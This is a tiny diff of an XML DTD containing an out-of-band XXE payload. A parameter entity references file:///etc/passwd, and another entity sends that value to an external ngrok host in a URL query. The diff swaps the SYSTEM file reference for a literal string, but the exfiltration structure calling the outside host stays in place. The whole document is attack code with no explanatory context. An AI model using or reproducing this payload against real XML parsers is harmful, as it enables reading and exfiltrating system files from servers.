@@ -1,4 +1,4 @@
-<!ENTITY % payload SYSTEM "file:///etc/passwd">
+<!ENTITY % payload "file:///etc/passwd">
 
 <!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://6.tcp.eu.ngrok.io:13577/?x=%payload;">'>
 %param1;
